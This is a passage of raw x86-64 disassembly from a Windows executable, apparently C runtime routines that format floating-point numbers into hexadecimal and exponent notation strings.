   14000e8f7:	8b d8                	mov    %eax,%ebx
   14000e8f9:	85 c0                	test   %eax,%eax
   14000e8fb:	74 08                	je     0x14000e905
   14000e8fd:	44 88 0f             	mov    %r9b,(%rdi)
   14000e900:	e9 a0 02 00 00       	jmp    0x14000eba5
   14000e905:	80 7f 02 2d          	cmpb   $0x2d,0x2(%rdi)
   14000e909:	be 01 00 00 00       	mov    $0x1,%esi
   14000e90e:	75 06                	jne    0x14000e916
   14000e910:	c6 07 2d             	movb   $0x2d,(%rdi)
   14000e913:	48 03 fe             	add    %rsi,%rdi
   14000e916:	8b 9c 24 a0 00 00 00 	mov    0xa0(%rsp),%ebx
   14000e91d:	44 88 3f             	mov    %r15b,(%rdi)
   14000e920:	ba 65 00 00 00       	mov    $0x65,%edx
   14000e925:	8b c3                	mov    %ebx,%eax
   14000e927:	f7 d8                	neg    %eax
   14000e929:	1a c9                	sbb    %cl,%cl
   14000e92b:	80 e1 e0             	and    $0xe0,%cl
   14000e92e:	80 c1 78             	add    $0x78,%cl
   14000e931:	88 0c 37             	mov    %cl,(%rdi,%rsi,1)
   14000e934:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   14000e938:	48 03 cf             	add    %rdi,%rcx
   14000e93b:	e8 1c 0d 00 00       	call   0x14000f65c
   14000e940:	45 33 c9             	xor    %r9d,%r9d
   14000e943:	48 85 c0             	test   %rax,%rax
   14000e946:	0f 84 56 02 00 00    	je     0x14000eba2
   14000e94c:	f7 db                	neg    %ebx
   14000e94e:	1a c9                	sbb    %cl,%cl
   14000e950:	80 e1 e0             	and    $0xe0,%cl
   14000e953:	80 c1 70             	add    $0x70,%cl
   14000e956:	88 08                	mov    %cl,(%rax)
   14000e958:	44 88 48 03          	mov    %r9b,0x3(%rax)
   14000e95c:	e9 41 02 00 00       	jmp    0x14000eba2
   14000e961:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000e968:	00 00 80 
   14000e96b:	be 01 00 00 00       	mov    $0x1,%esi
   14000e970:	49 85 06             	test   %rax,(%r14)
   14000e973:	74 06                	je     0x14000e97b
   14000e975:	c6 07 2d             	movb   $0x2d,(%rdi)
   14000e978:	48 03 fe             	add    %rsi,%rdi
   14000e97b:	44 8b ac 24 a0 00 00 	mov    0xa0(%rsp),%r13d
   14000e982:	00 
   14000e983:	45 8b d7             	mov    %r15d,%r10d
   14000e986:	49 bb ff ff ff ff ff 	movabs $0xfffffffffffff,%r11
   14000e98d:	ff 0f 00 
   14000e990:	44 88 17             	mov    %r10b,(%rdi)
   14000e993:	48 03 fe             	add    %rsi,%rdi
   14000e996:	41 8b c5             	mov    %r13d,%eax
   14000e999:	f7 d8                	neg    %eax
   14000e99b:	41 8b c5             	mov    %r13d,%eax
   14000e99e:	1a c9                	sbb    %cl,%cl
   14000e9a0:	80 e1 e0             	and    $0xe0,%cl
   14000e9a3:	80 c1 78             	add    $0x78,%cl
   14000e9a6:	88 0f                	mov    %cl,(%rdi)
   14000e9a8:	48 03 fe             	add    %rsi,%rdi
   14000e9ab:	f7 d8                	neg    %eax
   14000e9ad:	1b d2                	sbb    %edx,%edx
   14000e9af:	48 b8 00 00 00 00 00 	movabs $0x7ff0000000000000,%rax
   14000e9b6:	00 f0 7f 
   14000e9b9:	83 e2 e0             	and    $0xffffffe0,%edx
   14000e9bc:	83 ea d9             	sub    $0xffffffd9,%edx
   14000e9bf:	49 85 06             	test   %rax,(%r14)
   14000e9c2:	75 1b                	jne    0x14000e9df
   14000e9c4:	44 88 17             	mov    %r10b,(%rdi)
   14000e9c7:	49 8b 06             	mov    (%r14),%rax
   14000e9ca:	48 03 fe             	add    %rsi,%rdi
   14000e9cd:	49 23 c3             	and    %r11,%rax
   14000e9d0:	48 f7 d8             	neg    %rax
   14000e9d3:	4d 1b e4             	sbb    %r12,%r12
   14000e9d6:	41 81 e4 fe 03 00 00 	and    $0x3fe,%r12d
   14000e9dd:	eb 06                	jmp    0x14000e9e5
   14000e9df:	c6 07 31             	movb   $0x31,(%rdi)
   14000e9e2:	48 03 fe             	add    %rsi,%rdi
   14000e9e5:	4c 8b ff             	mov    %rdi,%r15
   14000e9e8:	48 03 fe             	add    %rsi,%rdi
   14000e9eb:	85 db                	test   %ebx,%ebx
   14000e9ed:	75 05                	jne    0x14000e9f4
   14000e9ef:	45 88 0f             	mov    %r9b,(%r15)
   14000e9f2:	eb 14                	jmp    0x14000ea08
   14000e9f4:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000e9f9:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000ea00:	48 8b 01             	mov    (%rcx),%rax
   14000ea03:	8a 08                	mov    (%rax),%cl
   14000ea05:	41 88 0f             	mov    %cl,(%r15)
   14000ea08:	4d 85 1e             	test   %r11,(%r14)
   14000ea0b:	0f 86 88 00 00 00    	jbe    0x14000ea99
   14000ea11:	49 b8 00 00 00 00 00 	movabs $0xf000000000000,%r8
   14000ea18:	00 0f 00 
   14000ea1b:	85 db                	test   %ebx,%ebx
   14000ea1d:	7e 2d                	jle    0x14000ea4c
   14000ea1f:	49 8b 06             	mov    (%r14),%rax
   14000ea22:	40 8a cd             	mov    %bpl,%cl
   14000ea25:	49 23 c0             	and    %r8,%rax
   14000ea28:	49 23 c3             	and    %r11,%rax
   14000ea2b:	48 d3 e8             	shr    %cl,%rax
   14000ea2e:	66 41 03 c2          	add    %r10w,%ax
   14000ea32:	66 83 f8 39          	cmp    $0x39,%ax
   14000ea36:	76 03                	jbe    0x14000ea3b
   14000ea38:	66 03 c2             	add    %dx,%ax
   14000ea3b:	88 07                	mov    %al,(%rdi)
   14000ea3d:	49 c1 e8 04          	shr    $0x4,%r8
   14000ea41:	2b de                	sub    %esi,%ebx
   14000ea43:	48 03 fe             	add    %rsi,%rdi
   14000ea46:	66 83 c5 fc          	add    $0xfffc,%bp
   14000ea4a:	79 cf                	jns    0x14000ea1b
   14000ea4c:	66 85 ed             	test   %bp,%bp
   14000ea4f:	78 48                	js     0x14000ea99
   14000ea51:	49 8b 06             	mov    (%r14),%rax
   14000ea54:	40 8a cd             	mov    %bpl,%cl
   14000ea57:	49 23 c0             	and    %r8,%rax
   14000ea5a:	49 23 c3             	and    %r11,%rax
   14000ea5d:	48 d3 e8             	shr    %cl,%rax
   14000ea60:	66 83 f8 08          	cmp    $0x8,%ax
   14000ea64:	76 33                	jbe    0x14000ea99
   14000ea66:	48 8d 4f ff          	lea    -0x1(%rdi),%rcx
   14000ea6a:	8a 01                	mov    (%rcx),%al
   14000ea6c:	2c 46                	sub    $0x46,%al
   14000ea6e:	a8 df                	test   $0xdf,%al
   14000ea70:	75 08                	jne    0x14000ea7a
   14000ea72:	44 88 11             	mov    %r10b,(%rcx)
   14000ea75:	48 2b ce             	sub    %rsi,%rcx
   14000ea78:	eb f0                	jmp    0x14000ea6a
   14000ea7a:	49 3b cf             	cmp    %r15,%rcx
   14000ea7d:	74 14                	je     0x14000ea93
   14000ea7f:	8a 01                	mov    (%rcx),%al
   14000ea81:	3c 39                	cmp    $0x39,%al
   14000ea83:	75 07                	jne    0x14000ea8c
   14000ea85:	80 c2 3a             	add    $0x3a,%dl
   14000ea88:	88 11                	mov    %dl,(%rcx)
   14000ea8a:	eb 0d                	jmp    0x14000ea99
   14000ea8c:	40 02 c6             	add    %sil,%al
   14000ea8f:	88 01                	mov    %al,(%rcx)
   14000ea91:	eb 06                	jmp    0x14000ea99
   14000ea93:	48 2b ce             	sub    %rsi,%rcx
   14000ea96:	40 00 31             	add    %sil,(%rcx)
   14000ea99:	85 db                	test   %ebx,%ebx
   14000ea9b:	7e 18                	jle    0x14000eab5
   14000ea9d:	4c 8b c3             	mov    %rbx,%r8
   14000eaa0:	41 8a d2             	mov    %r10b,%dl
   14000eaa3:	48 8b cf             	mov    %rdi,%rcx
   14000eaa6:	e8 f5 3c ff ff       	call   0x1400027a0
   14000eaab:	48 03 fb             	add    %rbx,%rdi
   14000eaae:	45 33 c9             	xor    %r9d,%r9d
   14000eab1:	45 8d 51 30          	lea    0x30(%r9),%r10d
   14000eab5:	45 38 0f             	cmp    %r9b,(%r15)
   14000eab8:	49 0f 44 ff          	cmove  %r15,%rdi
   14000eabc:	41 f7 dd             	neg    %r13d
   14000eabf:	1a c0                	sbb    %al,%al
   14000eac1:	24 e0                	and    $0xe0,%al
   14000eac3:	04 70                	add    $0x70,%al
   14000eac5:	88 07                	mov    %al,(%rdi)
   14000eac7:	49 8b 0e             	mov    (%r14),%rcx
   14000eaca:	48 03 fe             	add    %rsi,%rdi
   14000eacd:	48 c1 e9 34          	shr    $0x34,%rcx
   14000ead1:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
   14000ead7:	49 2b cc             	sub    %r12,%rcx
   14000eada:	78 08                	js     0x14000eae4
   14000eadc:	c6 07 2b             	movb   $0x2b,(%rdi)
   14000eadf:	48 03 fe             	add    %rsi,%rdi
   14000eae2:	eb 09                	jmp    0x14000eaed
   14000eae4:	c6 07 2d             	movb   $0x2d,(%rdi)
   14000eae7:	48 03 fe             	add    %rsi,%rdi
   14000eaea:	48 f7 d9             	neg    %rcx
   14000eaed:	4c 8b c7             	mov    %rdi,%r8
   14000eaf0:	44 88 17             	mov    %r10b,(%rdi)
   14000eaf3:	48 81 f9 e8 03 00 00 	cmp    $0x3e8,%rcx
   14000eafa:	7c 33                	jl     0x14000eb2f
   14000eafc:	48 b8 cf f7 53 e3 a5 	movabs $0x20c49ba5e353f7cf,%rax
   14000eb03:	9b c4 20 
   14000eb06:	48 f7 e9             	imul   %rcx
   14000eb09:	48 c1 fa 07          	sar    $0x7,%rdx
   14000eb0d:	48 8b c2             	mov    %rdx,%rax
   14000eb10:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000eb14:	48 03 d0             	add    %rax,%rdx
   14000eb17:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   14000eb1b:	88 07                	mov    %al,(%rdi)
   14000eb1d:	48 03 fe             	add    %rsi,%rdi
   14000eb20:	48 69 c2 18 fc ff ff 	imul   $0xfffffffffffffc18,%rdx,%rax
   14000eb27:	48 03 c8             	add    %rax,%rcx
   14000eb2a:	49 3b f8             	cmp    %r8,%rdi
   14000eb2d:	75 06                	jne    0x14000eb35
   14000eb2f:	48 83 f9 64          	cmp    $0x64,%rcx
   14000eb33:	7c 2e                	jl     0x14000eb63
   14000eb35:	48 b8 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rax
   14000eb3c:	0a d7 a3 
   14000eb3f:	48 f7 e9             	imul   %rcx
   14000eb42:	48 03 d1             	add    %rcx,%rdx
   14000eb45:	48 c1 fa 06          	sar    $0x6,%rdx
   14000eb49:	48 8b c2             	mov    %rdx,%rax
   14000eb4c:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000eb50:	48 03 d0             	add    %rax,%rdx
   14000eb53:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   14000eb57:	88 07                	mov    %al,(%rdi)
   14000eb59:	48 03 fe             	add    %rsi,%rdi
   14000eb5c:	48 6b c2 9c          	imul   $0xffffffffffffff9c,%rdx,%rax
   14000eb60:	48 03 c8             	add    %rax,%rcx
   14000eb63:	49 3b f8             	cmp    %r8,%rdi
   14000eb66:	75 06                	jne    0x14000eb6e
   14000eb68:	48 83 f9 0a          	cmp    $0xa,%rcx
   14000eb6c:	7c 2b                	jl     0x14000eb99
   14000eb6e:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   14000eb75:	66 66 66 
   14000eb78:	48 f7 e9             	imul   %rcx
   14000eb7b:	48 c1 fa 02          	sar    $0x2,%rdx
   14000eb7f:	48 8b c2             	mov    %rdx,%rax
   14000eb82:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000eb86:	48 03 d0             	add    %rax,%rdx
   14000eb89:	41 8d 04 12          	lea    (%r10,%rdx,1),%eax
   14000eb8d:	88 07                	mov    %al,(%rdi)
   14000eb8f:	48 03 fe             	add    %rsi,%rdi
   14000eb92:	48 6b c2 f6          	imul   $0xfffffffffffffff6,%rdx,%rax
   14000eb96:	48 03 c8             	add    %rax,%rcx
   14000eb99:	41 02 ca             	add    %r10b,%cl
   14000eb9c:	88 0f                	mov    %cl,(%rdi)
   14000eb9e:	44 88 4f 01          	mov    %r9b,0x1(%rdi)
   14000eba2:	41 8b d9             	mov    %r9d,%ebx
   14000eba5:	44 38 4c 24 48       	cmp    %r9b,0x48(%rsp)
   14000ebaa:	74 0c                	je     0x14000ebb8
   14000ebac:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000ebb1:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000ebb8:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   14000ebbd:	8b c3                	mov    %ebx,%eax
   14000ebbf:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000ebc3:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   14000ebc7:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000ebcb:	49 8b e3             	mov    %r11,%rsp
   14000ebce:	41 5f                	pop    %r15
   14000ebd0:	41 5e                	pop    %r14
   14000ebd2:	41 5d                	pop    %r13
   14000ebd4:	41 5c                	pop    %r12
   14000ebd6:	5f                   	pop    %rdi
   14000ebd7:	c3                   	ret
   14000ebd8:	48 8b c4             	mov    %rsp,%rax
   14000ebdb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000ebdf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000ebe3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000ebe7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000ebeb:	41 55                	push   %r13
   14000ebed:	41 56                	push   %r14
   14000ebef:	41 57                	push   %r15
   14000ebf1:	48 83 ec 50          	sub    $0x50,%rsp
   14000ebf5:	4c 8b f2             	mov    %rdx,%r14
   14000ebf8:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   14000ebff:	00 
   14000ec00:	48 8b f9             	mov    %rcx,%rdi
   14000ec03:	48 8d 48 c8          	lea    -0x38(%rax),%rcx
   14000ec07:	45 8b e9             	mov    %r9d,%r13d
   14000ec0a:	49 63 f0             	movslq %r8d,%rsi
   14000ec0d:	e8 2a 63 ff ff       	call   0x140004f3c
   14000ec12:	48 85 ff             	test   %rdi,%rdi
   14000ec15:	74 05                	je     0x14000ec1c
   14000ec17:	4d 85 f6             	test   %r14,%r14
   14000ec1a:	75 0c                	jne    0x14000ec28
   14000ec1c:	e8 57 59 ff ff       	call   0x140004578
   14000ec21:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000ec26:	eb 1b                	jmp    0x14000ec43
   14000ec28:	33 c0                	xor    %eax,%eax
   14000ec2a:	85 f6                	test   %esi,%esi
   14000ec2c:	0f 4f c6             	cmovg  %esi,%eax
   14000ec2f:	83 c0 09             	add    $0x9,%eax
   14000ec32:	48 98                	cltq
   14000ec34:	4c 3b f0             	cmp    %rax,%r14
   14000ec37:	77 16                	ja     0x14000ec4f
   14000ec39:	e8 3a 59 ff ff       	call   0x140004578
   14000ec3e:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000ec43:	89 18                	mov    %ebx,(%rax)
   14000ec45:	e8 de 54 ff ff       	call   0x140004128
   14000ec4a:	e9 38 01 00 00       	jmp    0x14000ed87
   14000ec4f:	80 bc 24 98 00 00 00 	cmpb   $0x0,0x98(%rsp)
   14000ec56:	00 
   14000ec57:	48 8b ac 24 90 00 00 	mov    0x90(%rsp),%rbp
   14000ec5e:	00 
   14000ec5f:	74 34                	je     0x14000ec95
   14000ec61:	33 db                	xor    %ebx,%ebx
   14000ec63:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   14000ec67:	0f 94 c3             	sete   %bl
   14000ec6a:	45 33 ff             	xor    %r15d,%r15d
   14000ec6d:	48 03 df             	add    %rdi,%rbx
   14000ec70:	85 f6                	test   %esi,%esi
   14000ec72:	41 0f 9f c7          	setg   %r15b
   14000ec76:	45 85 ff             	test   %r15d,%r15d
   14000ec79:	74 1a                	je     0x14000ec95
   14000ec7b:	48 8b cb             	mov    %rbx,%rcx
   14000ec7e:	e8 cd 3e ff ff       	call   0x140002b50
   14000ec83:	49 63 cf             	movslq %r15d,%rcx
   14000ec86:	48 8b d3             	mov    %rbx,%rdx
   14000ec89:	4c 8d 40 01          	lea    0x1(%rax),%r8
   14000ec8d:	48 03 cb             	add    %rbx,%rcx
   14000ec90:	e8 8b 35 ff ff       	call   0x140002220
   14000ec95:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   14000ec99:	48 8b d7             	mov    %rdi,%rdx
   14000ec9c:	75 07                	jne    0x14000eca5
   14000ec9e:	c6 07 2d             	movb   $0x2d,(%rdi)
   14000eca1:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   14000eca5:	85 f6                	test   %esi,%esi
   14000eca7:	7e 1b                	jle    0x14000ecc4
   14000eca9:	8a 42 01             	mov    0x1(%rdx),%al
   14000ecac:	88 02                	mov    %al,(%rdx)
   14000ecae:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000ecb3:	48 ff c2             	inc    %rdx
   14000ecb6:	48 8b 88 f0 00 00 00 	mov    0xf0(%rax),%rcx
   14000ecbd:	48 8b 01             	mov    (%rcx),%rax
   14000ecc0:	8a 08                	mov    (%rax),%cl
   14000ecc2:	88 0a                	mov    %cl,(%rdx)
   14000ecc4:	33 c9                	xor    %ecx,%ecx
   14000ecc6:	48 8d 1c 32          	lea    (%rdx,%rsi,1),%rbx
   14000ecca:	4c 8d 05 cf 83 00 00 	lea    0x83cf(%rip),%r8        # 0x1400170a0
   14000ecd1:	38 8c 24 98 00 00 00 	cmp    %cl,0x98(%rsp)
   14000ecd8:	0f 94 c1             	sete   %cl
   14000ecdb:	48 03 d9             	add    %rcx,%rbx
   14000ecde:	48 2b fb             	sub    %rbx,%rdi
   14000ece1:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   14000ece5:	48 8b cb             	mov    %rbx,%rcx
   14000ece8:	49 8d 14 3e          	lea    (%r14,%rdi,1),%rdx
   14000ecec:	49 0f 44 d6          	cmove  %r14,%rdx
   14000ecf0:	e8 57 91 ff ff       	call   0x140007e4c
   14000ecf5:	85 c0                	test   %eax,%eax
   14000ecf7:	0f 85 be 00 00 00    	jne    0x14000edbb
   14000ecfd:	48 8d 4b 02          	lea    0x2(%rbx),%rcx
   14000ed01:	45 85 ed             	test   %r13d,%r13d
   14000ed04:	74 03                	je     0x14000ed09
   14000ed06:	c6 03 45             	movb   $0x45,(%rbx)
   14000ed09:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ed0d:	80 38 30             	cmpb   $0x30,(%rax)
   14000ed10:	74 56                	je     0x14000ed68
   14000ed12:	44 8b 45 04          	mov    0x4(%rbp),%r8d
   14000ed16:	41 ff c8             	dec    %r8d
   14000ed19:	79 07                	jns    0x14000ed22
   14000ed1b:	41 f7 d8             	neg    %r8d
   14000ed1e:	c6 43 01 2d          	movb   $0x2d,0x1(%rbx)
   14000ed22:	41 83 f8 64          	cmp    $0x64,%r8d
   14000ed26:	7c 1b                	jl     0x14000ed43
   14000ed28:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
   14000ed2d:	41 f7 e8             	imul   %r8d
   14000ed30:	c1 fa 05             	sar    $0x5,%edx
   14000ed33:	8b c2                	mov    %edx,%eax
   14000ed35:	c1 e8 1f             	shr    $0x1f,%eax
   14000ed38:	03 d0                	add    %eax,%edx
   14000ed3a:	00 53 02             	add    %dl,0x2(%rbx)
   14000ed3d:	6b c2 9c             	imul   $0xffffff9c,%edx,%eax
   14000ed40:	44 03 c0             	add    %eax,%r8d
   14000ed43:	41 83 f8 0a          	cmp    $0xa,%r8d
   14000ed47:	7c 1b                	jl     0x14000ed64
   14000ed49:	b8 67 66 66 66       	mov    $0x66666667,%eax
   14000ed4e:	41 f7 e8             	imul   %r8d
   14000ed51:	c1 fa 02             	sar    $0x2,%edx
   14000ed54:	8b c2                	mov    %edx,%eax
   14000ed56:	c1 e8 1f             	shr    $0x1f,%eax
   14000ed59:	03 d0                	add    %eax,%edx
   14000ed5b:	00 53 03             	add    %dl,0x3(%rbx)
   14000ed5e:	6b c2 f6             	imul   $0xfffffff6,%edx,%eax
   14000ed61:	44 03 c0             	add    %eax,%r8d
   14000ed64:	44 00 43 04          	add    %r8b,0x4(%rbx)
   14000ed68:	f6 05 cd ce 00 00 01 	testb  $0x1,0xcecd(%rip)        # 0x14001bc3c
   14000ed6f:	74 14                	je     0x14000ed85
   14000ed71:	80 39 30             	cmpb   $0x30,(%rcx)
   14000ed74:	75 0f                	jne    0x14000ed85
   14000ed76:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   14000ed7a:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000ed80:	e8 9b 34 ff ff       	call   0x140002220
   14000ed85:	33 db                	xor    %ebx,%ebx
   14000ed87:	80 7c 24 48 00       	cmpb   $0x0,0x48(%rsp)
   14000ed8c:	74 0c                	je     0x14000ed9a
   14000ed8e:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000ed93:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   14000ed9a:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   14000ed9f:	8b c3                	mov    %ebx,%eax
   14000eda1:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000eda5:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   14000eda9:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000edad:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000edb1:	49 8b e3             	mov    %r11,%rsp
   14000edb4:	41 5f                	pop    %r15
   14000edb6:	41 5e                	pop    %r14
   14000edb8:	41 5d                	pop    %r13
   14000edba:	c3                   	ret
   14000edbb:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000edc1:	45 33 c9             	xor    %r9d,%r9d
   14000edc4:	45 33 c0             	xor    %r8d,%r8d
   14000edc7:	33 d2                	xor    %edx,%edx
   14000edc9:	33 c9                	xor    %ecx,%ecx
   14000edcb:	e8 78 53 ff ff       	call   0x140004148
   14000edd0:	cc                   	int3
   14000edd1:	cc                   	int3
   14000edd2:	cc                   	int3
   14000edd3:	cc                   	int3
   14000edd4:	40 53                	rex push %rbx
   14000edd6:	55                   	push   %rbp
   14000edd7:	56                   	push   %rsi
   14000edd8:	57                   	push   %rdi
   14000edd9:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000ede0:	48 8b 05 19 a2 00 00 	mov    0xa219(%rip),%rax        # 0x140019000
   14000ede7:	48 33 c4             	xor    %rsp,%rax
   14000edea:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000edef:	48 8b 09             	mov    (%rcx),%rcx
   14000edf2:	49 8b d8             	mov    %r8,%rbx
   14000edf5:	48 8b fa             	mov    %rdx,%rdi
   14000edf8:	41 8b f1             	mov    %r9d,%esi
   14000edfb:	bd 16 00 00 00       	mov    $0x16,%ebp
   14000ee00:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   14000ee05:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000ee0a:	44 8b cd             	mov    %ebp,%r9d
   14000ee0d:	e8 2a 0b 00 00       	call   0x14000f93c
   14000ee12:	48 85 ff             	test   %rdi,%rdi
   14000ee15:	75 13                	jne    0x14000ee2a
   14000ee17:	e8 5c 57 ff ff       	call   0x140004578
   14000ee1c:	89 28                	mov    %ebp,(%rax)
   14000ee1e:	e8 05 53 ff ff       	call   0x140004128
   14000ee23:	8b c5                	mov    %ebp,%eax
   14000ee25:	e9 88 00 00 00       	jmp    0x14000eeb2
   14000ee2a:	48 85 db             	test   %rbx,%rbx
   14000ee2d:	74 e8                	je     0x14000ee17
   14000ee2f:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000ee33:	48 3b da             	cmp    %rdx,%rbx
   14000ee36:	74 1a                	je     0x14000ee52
   14000ee38:	33 c0                	xor    %eax,%eax
   14000ee3a:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   14000ee3f:	48 8b d3             	mov    %rbx,%rdx
   14000ee42:	0f 94 c0             	sete   %al
   14000ee45:	48 2b d0             	sub    %rax,%rdx
   14000ee48:	33 c0                	xor    %eax,%eax
   14000ee4a:	85 f6                	test   %esi,%esi
   14000ee4c:	0f 9f c0             	setg   %al
   14000ee4f:	48 2b d0             	sub    %rax,%rdx
   14000ee52:	33 c0                	xor    %eax,%eax
   14000ee54:	83 7c 24 40 2d       	cmpl   $0x2d,0x40(%rsp)
   14000ee59:	44 8d 46 01          	lea    0x1(%rsi),%r8d
   14000ee5d:	0f 94 c0             	sete   %al
   14000ee60:	33 c9                	xor    %ecx,%ecx
   14000ee62:	85 f6                	test   %esi,%esi
   14000ee64:	0f 9f c1             	setg   %cl
   14000ee67:	48 03 c7             	add    %rdi,%rax
   14000ee6a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000ee6f:	48 03 c8             	add    %rax,%rcx
   14000ee72:	e8 29 09 00 00       	call   0x14000f7a0
   14000ee77:	85 c0                	test   %eax,%eax
   14000ee79:	74 05                	je     0x14000ee80
   14000ee7b:	c6 07 00             	movb   $0x0,(%rdi)
   14000ee7e:	eb 32                	jmp    0x14000eeb2
   14000ee80:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
   14000ee87:	00 
   14000ee88:	44 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9d
   14000ee8f:	00 
   14000ee90:	44 8b c6             	mov    %esi,%r8d
   14000ee93:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000ee98:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000ee9d:	48 8b d3             	mov    %rbx,%rdx
   14000eea0:	48 8b cf             	mov    %rdi,%rcx
   14000eea3:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   14000eea8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000eead:	e8 26 fd ff ff       	call   0x14000ebd8
   14000eeb2:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000eeb7:	48 33 cc             	xor    %rsp,%rcx
   14000eeba:	e8 81 43 ff ff       	call   0x140003240
   14000eebf:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   14000eec6:	5f                   	pop    %rdi
   14000eec7:	5e                   	pop    %rsi
   14000eec8:	5d                   	pop    %rbp
   14000eec9:	5b                   	pop    %rbx
   14000eeca:	c3                   	ret
   14000eecb:	cc                   	int3
   14000eecc:	48 8b c4             	mov    %rsp,%rax
   14000eecf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000eed3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000eed7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000eedb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000eedf:	41 56                	push   %r14
   14000eee1:	48 83 ec 40          	sub    $0x40,%rsp
   14000eee5:	41 8b 59 04          	mov    0x4(%r9),%ebx
   14000eee9:	48 8b f2             	mov    %rdx,%rsi
   14000eeec:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   14000eef1:	48 8b f9             	mov    %rcx,%rdi
   14000eef4:	48 8d 48 d8          	lea    -0x28(%rax),%rcx
   14000eef8:	49 8b e9             	mov    %r9,%rbp
   14000eefb:	ff cb                	dec    %ebx
   14000eefd:	45 8b f0             	mov    %r8d,%r14d
   14000ef00:	e8 37 60 ff ff       	call   0x140004f3c
   14000ef05:	48 85 ff             	test   %rdi,%rdi
   14000ef08:	74 05                	je     0x14000ef0f
   14000ef0a:	48 85 f6             	test   %rsi,%rsi
   14000ef0d:	75 16                	jne    0x14000ef25
   14000ef0f:	e8 64 56 ff ff       	call   0x140004578
   14000ef14:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000ef19:	89 18                	mov    %ebx,(%rax)
   14000ef1b:	e8 08 52 ff ff       	call   0x140004128
   14000ef20:	e9 d8 00 00 00       	jmp    0x14000effd
   14000ef25:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   14000ef2a:	74 1a                	je     0x14000ef46
   14000ef2c:	41 3b de             	cmp    %r14d,%ebx
   14000ef2f:	75 15                	jne    0x14000ef46
   14000ef31:	33 c0                	xor    %eax,%eax
   14000ef33:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   14000ef37:	48 63 cb             	movslq %ebx,%rcx
   14000ef3a:	0f 94 c0             	sete   %al
   14000ef3d:	48 03 c7             	add    %rdi,%rax
   14000ef40:	66 c7 04 01 30 00    	movw   $0x30,(%rcx,%rax,1)
   14000ef46:	83 7d 00 2d          	cmpl   $0x2d,0x0(%rbp)
   14000ef4a:	75 06                	jne    0x14000ef52
   14000ef4c:	c6 07 2d             	movb   $0x2d,(%rdi)
   14000ef4f:	48 ff c7             	inc    %rdi
   14000ef52:	83 7d 04 00          	cmpl   $0x0,0x4(%rbp)
   14000ef56:	7f 20                	jg     0x14000ef78
   14000ef58:	48 8b cf             	mov    %rdi,%rcx
   14000ef5b:	e8 f0 3b ff ff       	call   0x140002b50
   14000ef60:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   14000ef64:	48 8b d7             	mov    %rdi,%rdx
   14000ef67:	4c 8d 40 01          	lea    0x1(%rax),%r8
   14000ef6b:	e8 b0 32 ff ff       	call   0x140002220
   14000ef70:	c6 07 30             	movb   $0x30,(%rdi)
   14000ef73:	48 ff c7             	inc    %rdi
   14000ef76:	eb 07                	jmp    0x14000ef7f
